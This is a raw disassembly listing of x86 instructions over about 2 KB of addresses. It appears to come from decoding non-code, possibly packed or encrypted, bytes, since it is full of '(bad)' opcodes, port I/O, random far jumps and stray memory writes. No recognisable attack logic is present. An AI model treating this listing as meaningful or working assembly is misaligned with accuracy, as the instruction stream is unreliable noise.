  4083dc:	inc    ebp
  4083dd:	retf   
  4083de:	add    al,0x8a
  4083e0:	xchg   ebx,eax
  4083e1:	lods   al,BYTE PTR ds:[esi]
  4083e2:	ret    
  4083e3:	cld    
  4083e4:	(bad)  
  4083e5:	mov    esi,0x7f7e041
  4083ea:	or     DWORD PTR [ebx-0x72],esi
  4083ed:	fimul  DWORD PTR [ebx+0x3]
  4083f0:	mov    ds:0xe5d42e5d,eax
  4083f5:	pop    ebx
  4083f6:	add    esp,ebp
  4083f8:	cmp    al,0x4f
  4083fa:	in     al,dx
  4083fb:	cmp    al,BYTE PTR [edx]
  4083fd:	or     ebx,eax
  4083ff:	out    dx,eax
  408400:	mov    edx,0xa8f098b2
  408405:	(bad)  
  408406:	jae    0x408398
  408408:	call   0xe394bbb7
  40840d:	imul   esi,edx,0xd1361827
  408413:	pop    ebx
  408414:	xchg   edi,eax
  408415:	add    al,bl
  408417:	stos   DWORD PTR es:[edi],eax
  408418:	lea    ebp,[edx]
  40841a:	js     0x4083bb
  40841c:	mov    dh,0x65
  40841e:	add    cl,BYTE PTR [ecx+0x75]
  408421:	mov    dh,0x54
  408423:	fisub  WORD PTR [edi-0x6e]
  408426:	js     0x408444
  408428:	xlat   BYTE PTR ds:[ebx]
  408429:	sbb    BYTE PTR [ecx-0x6f],bh
  40842c:	xchg   ebp,eax
  40842d:	xor    ecx,ecx
  40842f:	gs adc bl,ah
  408432:	or     eax,0x9c3621ed
  408437:	and    ecx,esi
  408439:	or     edx,DWORD PTR [ebp+edx*8-0x7e113fb5]
  408440:	iret   
  408441:	push   edx
  408442:	and    al,0x23
  408444:	int    0x9e
  408446:	sbb    dh,BYTE PTR [ebp-0x30]
  408449:	cs out 0x27,al
  40844c:	push   ecx
  40844d:	popa   
  40844e:	mov    dh,dl
  408450:	popf   
  408451:	cdq    
  408452:	xchg   esp,eax
  408453:	xchg   ebp,eax
  408454:	stc    
  408455:	add    DWORD PTR [eax+0x59],ecx
  408458:	xchg   ebp,eax
  408459:	sub    DWORD PTR [edi-0x6b2ba507],ebp
  40845f:	scas   al,BYTE PTR es:[edi]
  408460:	xchg   esp,eax
  408461:	icebp  
  408462:	sbb    dh,BYTE PTR [esi+0x3b1368b]
  408468:	aaa    
  408469:	xor    DWORD PTR [eax+eax*2+0x532ec01a],ebx
  408470:	rcr    DWORD PTR [esi-0x187b0b4d],cl
  408476:	int3   
  408477:	dec    esi
  408478:	jmp    0x163b:0x6ca88fae
  40847f:	mov    ds:0x571cbee4,eax
  408484:	jle    0x4084cc
  408486:	jnp    0x408435
  408488:	sbb    ecx,DWORD PTR [ebp-0x531f40ec]
  40848e:	imul   ecx,DWORD PTR [ebx+0x266ceef3],0x19
  408495:	jno    0x40846a
  408497:	mov    ebp,DWORD PTR [esi-0x3123cd0]
  40849d:	retf   
  40849e:	add    DWORD PTR [esi],ebx
  4084a0:	or     BYTE PTR [esi-0x50],dl
  4084a3:	push   ebp
  4084a4:	loop   0x408518
  4084a6:	test   DWORD PTR [eax],esp
  4084a8:	push   es
  4084a9:	retf   
  4084aa:	jne    0x408472
  4084ac:	adc    ebx,ebx
  4084ae:	mov    cl,0xd2
  4084b0:	and    DWORD PTR [edi-0x111c8067],edi
  4084b6:	ficomp WORD PTR [esi-0x4e3330dc]
  4084bc:	in     al,0xd2
  4084be:	mov    ecx,0xd641c581
  4084c3:	int    0x17
  4084c5:	jo     0x4084ab
  4084c7:	xor    cl,bl
  4084c9:	adc    eax,DWORD PTR [eax-0x14]
  4084cc:	jb     0x40848b
  4084ce:	inc    ecx
  4084cf:	sbb    eax,0x808fe6c8
  4084d4:	mov    esp,edi
  4084d6:	loopne 0x40852f
  4084d8:	aas    
  4084d9:	hlt    
  4084da:	ret    0x6acf
  4084dd:	adc    al,0xb1
  4084df:	out    dx,eax
  4084e0:	leave  
  4084e1:	pushf  
  4084e2:	arpl   WORD PTR [ebp-0xa],bx
  4084e5:	mov    eax,ds:0x213d9b7f
  4084ea:	sar    BYTE PTR [edx+0x5e6bf4a4],1
  4084f0:	mov    ebp,0x3068ab0e
  4084f5:	xor    DWORD PTR [ebp+0x5568996e],esi
  4084fb:	es xchg ebp,eax
  4084fd:	jo     0x4084bd
  4084ff:	arpl   WORD PTR [esi-0x5383330d],cx
  408505:	pop    ebx
  408506:	cwde   
  408507:	aaa    
  408508:	dec    edi
  408509:	scas   eax,DWORD PTR es:[edi]
  40850a:	pop    edi
  40850b:	outs   dx,DWORD PTR ds:[esi]
  40850c:	ret    
  40850d:	mov    WORD PTR ds:[ebp+0x34],fs
  408511:	in     al,dx
  408512:	dec    ebp
  408513:	cmp    al,0xa3
  408515:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408516:	lods   eax,DWORD PTR ds:[esi]
  408517:	sbb    bh,BYTE PTR [eax]
  408519:	jne    0x4084f1
  40851b:	push   eax
  40851c:	out    dx,al
  40851d:	lahf   
  40851e:	mov    si,0x1618
  408522:	retf   
  408523:	aad    0xb2
  408525:	hlt    
  408526:	push   ecx
  408527:	data16 xor BYTE PTR [eax+0x468d113],ah
  40852e:	mov    DWORD PTR ss:[eax],eax
  408531:	mov    bl,0xfd
  408533:	xor    DWORD PTR [ebx+0x1277505d],ebx
  408539:	pop    ebx
  40853a:	push   edi
  40853b:	mov    ds:0xe386f09a,al
  408540:	outs   dx,BYTE PTR ds:[esi]
  408541:	jmp    0x1df5:0xe67762d1
  408548:	cwde   
  408549:	push   ds
  40854a:	mov    esp,0x1c28a117
  40854f:	cmc    
  408550:	dec    ebx
  408551:	in     eax,0x4
  408553:	dec    ebp
  408554:	lods   al,BYTE PTR ds:[esi]
  408555:	sbb    al,0x14
  408557:	lds    ebx,FWORD PTR [ebx+0x2]
  40855a:	pop    ss
  40855b:	xor    dh,ch
  40855d:	cwde   
  40855e:	mov    dl,0x4a
  408560:	lods   al,BYTE PTR ds:[esi]
  408561:	mov    esi,0xe7ce63a8
  408566:	jp     0x40859b
  408568:	or     al,0xda
  40856a:	or     bh,BYTE PTR [esi-0x61]
  40856d:	aam    0xb7
  40856f:	ins    DWORD PTR es:[edi],dx
  408570:	jmp    FWORD PTR [ebp+edi*2-0x636a90bd]
  408577:	push   esi
  408578:	cld    
  408579:	xor    al,0xd5
  40857b:	in     al,0x9a
  40857d:	dec    ecx
  40857e:	mov    eax,ecx
  408580:	stc    
  408581:	inc    edx
  408582:	sbb    eax,0xf57901d3
  408587:	mov    DWORD PTR [edx+0x30444693],edx
  40858d:	in     eax,dx
  40858e:	push   0x4ec789d1
  408593:	scas   eax,DWORD PTR es:[edi]
  408594:	pop    ss
  408595:	fisub  WORD PTR ds:0x219bd9bd
  40859b:	and    dl,BYTE PTR [ebp+0x3d2c9089]
  4085a1:	push   esp
  4085a2:	cmp    cl,BYTE PTR [ebx+0x16bc8231]
  4085a8:	(bad)
  4085ac:	dec    esi
  4085ad:	test   al,0xcf
  4085af:	cmp    ebp,edx
  4085b1:	jnp    0x40861c
  4085b3:	adc    eax,0x77a1764b
  4085b8:	adc    esp,DWORD PTR [ebp+0x246c859b]
  4085be:	ret    0x4790
  4085c1:	int3   
  4085c2:	jnp    0x408575
  4085c4:	fild   QWORD PTR [ecx+esi*8]
  4085c7:	push   esi
  4085c8:	mov    WORD PTR [ebp+0x64],ds
  4085cb:	ins    BYTE PTR es:[edi],dx
  4085cc:	xchg   ax,ax
  4085ce:	sbb    ebx,DWORD PTR [edx]
  4085d0:	loopne 0x40860b
  4085d2:	sub    eax,0xf63d8fe3
  4085d7:	fcom   DWORD PTR [edi]
  4085d9:	push   cs
  4085da:	dec    esp
  4085db:	popa   
  4085dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085dd:	xor    BYTE PTR [ecx-0x50982ce0],0x76
  4085e4:	sbb    al,0xec
  4085e6:	loope  0x408640
  4085e8:	pop    eax
  4085e9:	ficom  DWORD PTR [esi]
  4085eb:	bound  edx,QWORD PTR [edi-0x1c]
  4085ee:	mov    ebp,0xb37dac17
  4085f3:	mov    DWORD PTR [edx-0x402aeb80],ebx
  4085f9:	sub    al,0x93
  4085fb:	add    BYTE PTR [eax+esi*2+0x462b4120],ah
  408602:	mov    al,ds:0xd50c4298
  408607:	int3   
  408608:	dec    esp
  408609:	fild   DWORD PTR [ebx-0x6f]
  40860c:	fistp  DWORD PTR [esp+ebp*4+0x45]
  408610:	fmul   st,st(1)
  408612:	add    DWORD PTR [edi-0x78],0xd7d27fa8
  408619:	cmp    BYTE PTR [esp+eax*4-0x77834c30],0xf6
  408621:	std    
  408622:	mov    esp,ebx
  408624:	loop   0x408633
  408626:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408627:	lahf   
  408628:	fs jnp 0x4085db
  40862b:	mov    ecx,0xa3d109d
  408630:	mov    ch,0xf0
  408632:	or     eax,0x70f4abdb
  408637:	pusha  
  408638:	aas    
  408639:	cmovbe ebx,DWORD PTR [eax+0x6ce591b1]
  408640:	pop    ss
  408641:	or     dh,BYTE PTR [edx+0x13]
  408644:	jbe    0x408659
  408646:	leave  
  408647:	mov    ecx,esi
  408649:	push   ebp
  40864a:	scas   eax,DWORD PTR es:[edi]
  40864b:	aam    0xd2
  40864d:	leave  
  40864e:	and    bl,BYTE PTR [edx+0x13]
  408651:	arpl   cx,bx
  408653:	stc    
  408654:	test   eax,0x1e499624
  408659:	adc    esi,DWORD PTR [eax-0x5c]
  40865c:	ret    0x69d0
  40865f:	popf   
  408660:	test   BYTE PTR [edx+0xf3ec2e],0x4f
  408667:	call   0xf7ce:0x3bf75e4d
  40866e:	mov    esp,0xecc0bee9
  408673:	in     al,0x72
  408675:	inc    edx
  408676:	sbb    eax,0x49f22276
  40867b:	rcr    DWORD PTR [edx+ebp*1-0x28],1
  40867f:	mov    bl,0x50
  408681:	stos   DWORD PTR es:[edi],eax
  408682:	pop    esp
  408683:	pop    ebp
  408684:	test   BYTE PTR [esi+0x2942d6d7],cl
  40868a:	and    eax,0xd529ab4f
  40868f:	xchg   DWORD PTR [edx-0x5005846b],ebx
  408695:	cmp    esp,eax
  408697:	xor    BYTE PTR [ecx+0x333014ba],0xa
  40869e:	mov    ds:0xbb608d25,al
  4086a3:	adc    ebx,0xdedb17ba
  4086a9:	xchg   ecx,eax
  4086aa:	stos   BYTE PTR es:[edi],al
  4086ab:	das    
  4086ac:	sub    BYTE PTR [esi+0x1011b0ed],al
  4086b2:	push   ebp
  4086b3:	sub    BYTE PTR [esi+0x7b],bl
  4086b6:	stc    
  4086b7:	in     eax,0x28
  4086b9:	test   eax,0x4a6c2cc7
  4086be:	mov    al,ds:0x63432ed5
  4086c3:	call   0xa6cc2e71
  4086c8:	add    ah,BYTE PTR [ebp-0x7e]
  4086cb:	call   0x9bd2126b
  4086d0:	mov    esp,0x507840cc
  4086d5:	imul   edx,DWORD PTR [edi-0x112dbb39],0x26
  4086dc:	in     al,dx
  4086dd:	cmc    
  4086de:	inc    eax
  4086df:	xchg   ebp,eax
  4086e0:	xor    bh,BYTE PTR [ecx]
  4086e2:	add    esp,edi
  4086e4:	cmp    eax,0xc2b510e5
  4086e9:	in     eax,dx
  4086ea:	mov    bh,0xe6
  4086ec:	mov    esi,0x522e018c
  4086f1:	jge    0x408760
  4086f3:	cmp    al,0xf4
  4086f5:	ret    
  4086f6:	adc    eax,0xa337eabb
  4086fb:	sbb    edi,edx
  4086fd:	add    cl,BYTE PTR [esi]
  4086ff:	ror    DWORD PTR [esi],0xf9
  408702:	inc    edx
  408703:	inc    esp
  408704:	cdq    
  408705:	pop    edx
  408706:	dec    eax
  408707:	ins    BYTE PTR es:[edi],dx
  408708:	ret    0x4ac0
  40870b:	mov    bh,0x6b
  40870d:	and    al,0xc
  40870f:	pusha  
  408710:	cmp    eax,0xfbaa34a6
  408715:	rol    DWORD PTR [ecx-0x64],1
  408718:	sub    ebp,DWORD PTR [esp+edi*4-0x4]
  40871c:	lds    esi,FWORD PTR [ebx]
  40871e:	cmp    BYTE PTR [ecx],bl
  408720:	mov    ch,0xd
  408722:	inc    eax
  408723:	add    eax,0x7076a4b3
  408728:	mov    bl,0x3f
  40872a:	mov    bh,0x7b
  40872c:	ja     0x408797
  40872e:	sub    edx,DWORD PTR [edx+0x49]
  408731:	pop    ecx
  408732:	xor    BYTE PTR [edx],ah
  408734:	aas    
  408735:	jb     0x408720
  408737:	and    bh,BYTE PTR es:[edx+eiz*1+0x35]
  40873c:	mov    WORD PTR [edx],es
  40873e:	pop    es
  40873f:	std    
  408740:	adc    ch,BYTE PTR [eax+0x51]
  408743:	xor    dl,al
  408745:	in     al,dx
  408746:	clc    
  408747:	loope  0x4086ca
  408749:	retf   
  40874a:	mov    ebp,0xdadade80
  40874f:	outs   dx,DWORD PTR ds:[esi]
  408750:	retf   
  408751:	inc    ebx
  408752:	jg     0x4086fb
  408754:	jl     0x408730
  408756:	adc    eax,0x4ead64ab
  40875b:	(bad)  
  40875c:	xchg   ebx,eax
  40875d:	jp     0x40871b
  40875f:	adc    eax,0xb1fbc855
  408764:	push   0x24ed770c
  408769:	bound  eax,QWORD PTR [edx-0x5e]
  40876c:	sar    DWORD PTR [eax+0x1b61036b],1
  408772:	push   cs
  408773:	leave  
  408774:	div    DWORD PTR [ebx]
  408776:	pop    esp
  408777:	xor    ebx,DWORD PTR ds:0x2a64f52d
  40877d:	enter  0x1ad7,0x1a
  408781:	push   edx
  408782:	jg     0x408727
  408784:	push   0xffffffe1
  408786:	dec    ebp
  408787:	xor    ecx,DWORD PTR [ebx+0x54]
  40878a:	push   cs
  40878b:	sahf   
  40878c:	lahf   
  40878d:	dec    ebx
  40878e:	adc    BYTE PTR ds:0x20f8205c,al
  408794:	cmp    eax,0x22d879d6
  408799:	and    al,ah
  40879b:	and    al,BYTE PTR [ebp+0x3e]
  40879e:	sub    BYTE PTR [esp],cl
  4087a1:	in     eax,0x3a
  4087a3:	dec    esp
  4087a4:	sub    BYTE PTR [esi-0x73],ch
  4087a7:	inc    ebp
  4087a8:	jp     0x40881c
  4087aa:	inc    edi
  4087ab:	popa   
  4087ac:	stos   DWORD PTR es:[edi],eax
  4087ad:	dec    edi
  4087ae:	dec    esp
  4087af:	xor    cl,bh
  4087b1:	(bad)  
  4087b2:	push   ebp
  4087b3:	test   eax,0x65dfedbb
  4087b8:	(bad)  
  4087b9:	lock lods al,BYTE PTR ds:[esi]
  4087bb:	xchg   ebx,eax
  4087bc:	mov    eax,ds:0x80b74554
  4087c1:	mov    ecx,0x215d7418
  4087c6:	data16 adc BYTE PTR [edi-0x4688d185],al
  4087cd:	mov    ah,0x2a
  4087cf:	sar    DWORD PTR [esp+ecx*1-0x3e1c33c],cl
  4087d6:	push   ss
  4087d7:	data16 cmp bh,BYTE PTR [edi+0x3f4c2369]
  4087de:	stc    
  4087df:	xchg   edi,eax
  4087e0:	cmc    
  4087e1:	dec    edi
  4087e2:	fadd   st(4),st
  4087e4:	push   0xb7673e9
  4087e9:	scas   al,BYTE PTR es:[edi]
  4087ea:	or     BYTE PTR [edi+esi*1+0x48],ah
  4087ee:	outs   dx,BYTE PTR ds:[esi]
  4087ef:	ins    BYTE PTR es:[edi],dx
  4087f0:	dec    ebx
  4087f1:	lock les edi,FWORD PTR [ecx]
  4087f4:	ins    BYTE PTR es:[edi],dx
  4087f5:	ja     0x408781
  4087f7:	mov    esi,0x6128902d
  4087fc:	push   esp
  4087fd:	jl     0x408788
  4087ff:	mov    cl,0x4e
  408801:	jnp    0x408818
  408803:	xchg   BYTE PTR [ebp+0x6f5d3328],dl
  408809:	int3   
  40880a:	in     eax,0xf3
  40880c:	push   ecx
  40880d:	call   0x23f8:0x502f1c7
  408814:	jmp    0xddac:0x8698c287
  40881b:	mov    BYTE PTR [esi],dl
  40881d:	push   edi
  40881e:	cmp    dl,BYTE PTR [edi-0x548ea0ac]
  408824:	xchg   ecx,eax
  408825:	cs hlt 
  408827:	adc    al,0xbd
  408829:	cmp    eax,0xbb5fe455
  40882e:	sbb    BYTE PTR [eax+0x4a362562],al
  408834:	mov    dl,0x4b
  408836:	mov    edi,0x421579d6
  40883b:	adc    BYTE PTR [ecx],ch
  40883d:	xlat   BYTE PTR ds:[ebx]
  40883e:	xor    al,0xb1
  408840:	and    DWORD PTR [eax+0x5c],0x31
  408844:	xlat   BYTE PTR ds:[ebx]
  408845:	lock jns 0x40886b
  408848:	je     0x4087e2
  40884a:	cmp    DWORD PTR [ecx],0x6e92b523
  408850:	xor    BYTE PTR [edx],ch
  408852:	call   0xc6feed03
  408857:	test   DWORD PTR [eax+edi*4+0x260f6155],ebp
  40885e:	xor    ah,BYTE PTR [edx]
  408860:	mov    dh,BYTE PTR [ecx+edi*1]
  408863:	aam    0x11
  408865:	enter  0x7463,0xa0
  408869:	nop
  40886a:	and    eax,0x365f4b9d
  40886f:	in     al,dx
  408870:	cmp    eax,DWORD PTR [esi+0x12]
  408873:	and    eax,0x8ff0c203
  408878:	mov    ecx,0x966d0de8
  40887d:	faddp  st(1),st
  40887f:	(bad)  
  408880:	jmp    0x7e6:0x6d9781e3
  408887:	cmp    BYTE PTR [ecx+eax*2+0xf],bl
  40888b:	xchg   BYTE PTR [ebx+0xb],ch
  40888e:	repnz (bad) 
  408890:	mov    ah,0x7a
  408892:	sar    cl,0x32
  408895:	ja     0x408860
  408897:	add    eax,0xa033cedd
  40889c:	cld    
  40889d:	mov    ebp,0xe75ae644
  4088a2:	pop    esp
  4088a3:	(bad)  
  4088a4:	stos   BYTE PTR es:[edi],al
  4088a5:	mov    al,ds:0x2303ad1
  4088aa:	mov    al,ds:0xee35d325
  4088af:	fwait
  4088b0:	jno    0x40892f
  4088b2:	xor    DWORD PTR [esi+0x7b],edx
  4088b5:	adc    BYTE PTR ds:0x73184f95,cl
  4088bb:	mov    ds:0x3c9bfd45,eax
  4088c0:	xchg   esi,eax
  4088c1:	js     0x4088c5
  4088c3:	adc    BYTE PTR [ebp+0x2cccdcab],al
  4088c9:	jne    0x408911
  4088cb:	xor    al,0xbf
  4088cd:	test   eax,0xeb26884e
  4088d2:	add    edx,DWORD PTR [edx-0x1928bd9f]
  4088d8:	push   ebp
  4088d9:	ins    DWORD PTR es:[edi],dx
  4088da:	scas   eax,DWORD PTR es:[edi]
  4088db:	pop    ss
  4088dc:	and    cl,ah
  4088de:	das    
  4088df:	push   ss
  4088e0:	test   eax,0x1d17a92b
  4088e5:	pop    DWORD PTR [ecx+ecx*2]
  4088e8:	cmp    ch,BYTE PTR [ecx-0x53]
  4088eb:	sbb    eax,0xaecc5249
  4088f0:	enter  0xf9e3,0x68
  4088f4:	inc    edi
  4088f5:	sub    eax,0xc8e4a70f
  4088fa:	push   edi
  4088fb:	test   esi,0x6aaa0c96
  408901:	sub    ch,cl
  408903:	cmp    DWORD PTR [edx-0x2d],ebx
  408906:	inc    eax
  408907:	pop    es
  408908:	enter  0x2ee8,0x55
  40890c:	or     dh,BYTE PTR [ebx+0x71]
  40890f:	dec    ebp
  408910:	push   0xffffffcc
  408912:	sub    edi,esp
  408914:	fadd   DWORD PTR [edi+0x6e]
  408917:	arpl   WORD PTR [ebx+0x1330fc72],di
  40891d:	ins    DWORD PTR es:[edi],dx
  40891e:	cli    
  40891f:	daa    
  408920:	ins    BYTE PTR es:[edi],dx
  408921:	or     eax,0x5a9fa08f
  408926:	dec    eax
  408927:	inc    ecx
  408928:	ja     0x408944
  40892a:	nop
  40892b:	cmp    ecx,eax
  40892d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40892e:	mov    ebp,0x2e9703b4
  408933:	pop    ds
  408934:	push   ebp
  408935:	into   
  408936:	jo     0x40897d
  408938:	icebp  
  408939:	mov    esp,0x5b57e404
  40893e:	cmp    cl,BYTE PTR [ecx]
  408940:	clc    
  408941:	ss ret 
  408943:	dec    eax
  408944:	and    dh,bl
  408946:	mov    ebx,0xe351a370
  40894b:	je     0x4088f3
  40894d:	(bad)  
  40894e:	mov    dl,0x9f
  408950:	repnz push 0x661eed49
  408956:	ds or  edx,esi
  408959:	es mov ah,0x7
  40895c:	mov    esp,0xdf890b65
  408961:	push   ss
  408962:	imul   esi,DWORD PTR [ecx],0x5f99dffa
  408968:	and    eax,0x5fc1a12c
  40896d:	jae    0x40896d
  40896f:	out    0x83,eax
  408971:	std    
  408972:	repz scas eax,DWORD PTR es:[edi]
  408974:	pop    esp
  408975:	popa   
  408976:	repz sub eax,0x3e5a89cc
  40897c:	les    ebx,FWORD PTR [ebp+ebx*1+0x9]
  408980:	imul   ecx,DWORD PTR [ebx],0x7f
  408983:	sbb    DWORD PTR [edx+ebp*8],ebp
  408986:	test   al,0xbf
  408988:	dec    edi
  408989:	call   0x4a81:0x59a4ff0d
  408990:	mov    ebp,?
  408992:	in     eax,dx
  408993:	dec    ebx
  408994:	adc    al,0xcd
  408996:	push   ebp
  408997:	push   ebx
  408998:	aad    0x2a
  40899a:	iret   
  40899b:	daa    
  40899c:	sbb    al,0xbc
  40899e:	adc    DWORD PTR [edx+0x18],edi
  4089a1:	or     edx,DWORD PTR [eax+ebx*8]
  4089a4:	mov    DWORD PTR [esi-0x17],esi
  4089a7:	add    eax,0x41effb2f
  4089ac:	mov    esp,0x9458cacb
  4089b1:	fiadd  WORD PTR [esi-0x3bd8d18]
  4089b7:	xchg   esi,eax
  4089b8:	les    esp,FWORD PTR [esp+edi*1-0x5638cf73]
  4089bf:	and    DWORD PTR [ebp-0x7b],ebp
  4089c2:	and    ah,ch
  4089c4:	push   esi
  4089c5:	sbb    BYTE PTR [eax+0x102cbea4],ch
  4089cb:	stos   BYTE PTR es:[edi],al
  4089cc:	jecxz  0x40896f
  4089ce:	sbb    al,0xdb
  4089d0:	pusha  
  4089d1:	xchg   BYTE PTR [edi],al
  4089d3:	jecxz  0x408987
  4089d5:	jo     0x408a05
  4089d7:	test   DWORD PTR [edx+edx*4],ebp
  4089da:	addr16 dec eax
  4089dc:	shr    DWORD PTR [eax+0x21],1
  4089df:	inc    edx
  4089e0:	stc    
  4089e1:	pop    ds
  4089e2:	jl     0x4089a8
  4089e4:	not    ch
  4089e6:	neg    BYTE PTR [edx+eax*8]
  4089e9:	inc    ebx
  4089ea:	out    dx,eax
  4089eb:	lahf   
  4089ec:	jmp    0xa43e:0x97afa09d
  4089f3:	and    al,0x40
  4089f5:	dec    edi
  4089f6:	cmp    BYTE PTR [esp+ebp*2+0x1dcd6480],0xec
  4089fe:	jmp    DWORD PTR [edx-0x67]
  408a01:	inc    ebx
  408a02:	mov    ecx,0x8f83db7e
  408a07:	pop    ss
  408a08:	inc    ebp
  408a09:	add    al,0xe2
  408a0b:	into   
  408a0c:	or     al,0x71
  408a0e:	retf   
  408a0f:	jp     0x408a39
  408a11:	pop    esp
  408a12:	cdq    
  408a13:	mov    esi,0x47c86128
  408a18:	mov    cl,0x19
  408a1a:	scas   eax,DWORD PTR es:[edi]
  408a1b:	pop    eax
  408a1c:	test   al,0x92
  408a1e:	mov    dl,BYTE PTR [eax+0x24]
  408a21:	and    eax,0x23f15e35
  408a26:	jnp    0x408a93
  408a28:	mov    ebx,esp
  408a2a:	test   dh,ch
  408a2c:	dec    edx
  408a2d:	inc    esi
  408a2e:	mov    ds:0x2c211ffd,eax
  408a33:	data16 ror BYTE PTR [esi+edx*1],1
  408a37:	fwait
  408a38:	or     BYTE PTR [edx],bh
  408a3a:	xchg   esi,eax
  408a3b:	cdq    
  408a3c:	push   cs
  408a3d:	cdq    
  408a3e:	cwde   
  408a3f:	sub    DWORD PTR [eax+0x3f],ebx
  408a42:	xchg   edi,eax
  408a43:	popa   
  408a44:	test   DWORD PTR ds:0xdd3b87f9,eax
  408a4a:	xchg   esi,eax
  408a4b:	adc    eax,0x12c91095
  408a50:	add    eax,0x9f51d83c
  408a55:	xor    bh,BYTE PTR [eax-0x616ef72e]
  408a5b:	fwait
  408a5c:	push   ss
  408a5d:	jnp    0x408a40
  408a5f:	mov    bh,0x5c
  408a61:	out    dx,eax
  408a62:	cmp    edx,DWORD PTR [ebx-0x6056539e]
  408a68:	mov    ds:0x47d042c8,ax
  408a6e:	lods   al,BYTE PTR ds:[esi]
  408a6f:	lods   al,BYTE PTR ds:[esi]
  408a70:	jecxz  0x408a6c
  408a72:	iret   
  408a73:	mov    bh,0xc6
  408a75:	jb     0x408a0e
  408a77:	sub    dh,dh
  408a79:	jmp    0x427fb49a
  408a7e:	push   ss
  408a7f:	xchg   bl,al
  408a81:	xor    BYTE PTR [esi-0x56],ah
  408a84:	jmp    0x408ad9
  408a86:	into   
  408a87:	ins    DWORD PTR es:[edi],dx
  408a88:	or     eax,eax
  408a8a:	xchg   ecx,eax
  408a8b:	hlt    
  408a8c:	push   ss
  408a8d:	sahf   
  408a8e:	pop    es
  408a8f:	add    BYTE PTR [edx-0x40],ah
  408a92:	mov    edi,0xb747cc06
  408a97:	dec    esp
  408a98:	sub    edx,esi
  408a9a:	dec    esp
  408a9b:	mul    BYTE PTR gs:[ebx+eiz*4-0x571d78bb]
  408aa3:	mov    WORD PTR [esi],gs
  408aa5:	pop    ss
  408aa6:	outs   dx,BYTE PTR ds:[esi]
  408aa7:	push   ss
  408aa8:	outs   dx,BYTE PTR ds:[esi]
  408aa9:	dec    ebx
  408aab:	cmp    al,0x25
  408aad:	and    eax,0x5c3b92f4
  408ab2:	pop    esp
  408ab3:	and    dh,BYTE PTR [ecx]
  408ab5:	or     BYTE PTR [eax-0x67],dl
  408ab8:	xchg   ebx,eax
  408ab9:	xchg   esi,eax
  408aba:	test   BYTE PTR [edx+0x67],ch
  408abd:	jnp    0x408b1a
  408abf:	ret    0x3c5b
  408ac2:	jmp    0x408a76
  408ac4:	out    0xc4,al
  408ac6:	aaa    
  408ac7:	mov    edi,0xf3a2debb
  408acc:	pop    edi
  408acd:	rcl    BYTE PTR [ebx-0x271228ca],1
  408ad3:	and    ecx,DWORD PTR [esi-0x74]
  408ad6:	jae    0x408b47
  408ad8:	test   al,0xe3
  408ada:	js     0x408a5d
  408adc:	xchg   edi,eax
  408add:	mov    ebx,0x41ff2452
  408ae2:	push   0x287b3451
  408ae7:	xchg   esp,eax
  408ae8:	or     eax,0x2cedd30b
  408aed:	xor    cl,ah
  408aef:	repz into 
  408af1:	mov    ah,0x96
  408af3:	(bad)  
  408af5:	shr    DWORD PTR [ebx],cl
  408af7:	in     eax,dx
  408af8:	scas   al,BYTE PTR es:[edi]
  408af9:	mov    eax,0xba4deca1
  408afe:	ins    BYTE PTR es:[edi],dx
  408aff:	cdq    
  408b00:	dec    ecx
  408b01:	stos   DWORD PTR es:[edi],eax
  408b02:	fisub  DWORD PTR [eax-0x667e7bc5]
  408b08:	push   cs
  408b09:	aad    0x82
  408b0b:	sbb    BYTE PTR [edx+0x7be2417e],cl
  408b11:	jno    0x408b26
  408b13:	xlat   BYTE PTR ds:[ebx]
  408b14:	outs   dx,BYTE PTR ds:[esi]
  408b15:	scas   eax,DWORD PTR es:[edi]
  408b16:	mov    esp,0x417b87e9
  408b1b:	idiv   BYTE PTR [eax+0x7b20cbf8]
  408b21:	popf   
  408b22:	retf   
  408b23:	xor    DWORD PTR [edi],ebx
  408b25:	mov    bh,0xbe
  408b27:	inc    esp
  408b28:	mov    eax,0x9e98cb64
  408b2d:	aam    0xd8
  408b2f:	ret    0xf8
  408b32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b33:	into   
  408b34:	fnstsw WORD PTR [ecx-0x7a]
  408b37:	test   DWORD PTR [edx],esi
  408b39:	dec    esp
  408b3a:	scas   al,BYTE PTR es:[edi]
  408b3b:	add    eax,0xe46d8fec
  408b40:	pop    es
  408b41:	push   edi
  408b42:	sub    ebx,DWORD PTR [ecx]
  408b44:	adc    BYTE PTR [edi+esi*4],cl
  408b47:	push   edx
  408b48:	ror    DWORD PTR [eax+eiz*4],cl
  408b4b:	nop
  408b4c:	lds    ecx,FWORD PTR [eax+0x6c22d27]
  408b52:	inc    edi
  408b53:	scas   al,BYTE PTR es:[edi]
  408b54:	sbb    al,BYTE PTR [eax-0x1e]
  408b57:	mov    esi,0xacfaf55e
  408b5c:	ret    0x2457
  408b5f:	inc    ecx
  408b60:	push   esi
  408b61:	cs daa 
  408b63:	iret   
  408b64:	popa   
  408b65:	ror    edi,1
  408b67:	sbb    ebp,DWORD PTR [ebp-0x52d34bc1]
  408b6d:	mov    dl,BYTE PTR [ecx+0x2a]
  408b70:	daa    
  408b71:	sub    DWORD PTR [edx-0x21],esi
  408b74:	sub    DWORD PTR [esi+ecx*8],esp
  408b77:	sti    
  408b78:	xchg   ebx,eax
  408b79:	not    esp
  408b7b:	and    BYTE PTR [ecx-0x53],dh
  408b7e:	int3   
  408b7f:	out    0x53,eax
  408b81:	mov    bl,BYTE PTR [eax+0x6d4c3b4b]
  408b87:	dec    edx
  408b88:	cmp    BYTE PTR [edx+0x1b],0x4
  408b8c:	out    dx,eax
  408b8d:	test   DWORD PTR [ecx-0x153fcfdf],0xac8dc972
  408b97:	es jmp 0xfc31:0x7b8ee4b1
  408b9f:	push   cs
  408ba0:	mov    dh,0x72
  408ba2:	adc    dh,bl
  408ba4:	daa    
  408ba5:	adc    bh,BYTE PTR [eax]
  408ba7:	and    esp,DWORD PTR [ebx+0x2f75032d]
  408bad:	xchg   ebx,eax
  408bae:	mov    bh,BYTE PTR gs:[esi-0x69972910]
  408bb5:	and    eax,0xbddad850
  408bbb:	call   0xc5f5:0xe3db4452
  408bc2:	and    al,cl
  408bc4:	adc    edx,DWORD PTR gs:[eax+0x71]
  408bc8:	push   0xdb26eb29
  408bcd:	repz fmul DWORD PTR [eax-0x665f5bc9]
  408bd4:	retf   0xe20d
  408bd7:	dec    ebx
  408bd8:	xchg   edx,eax
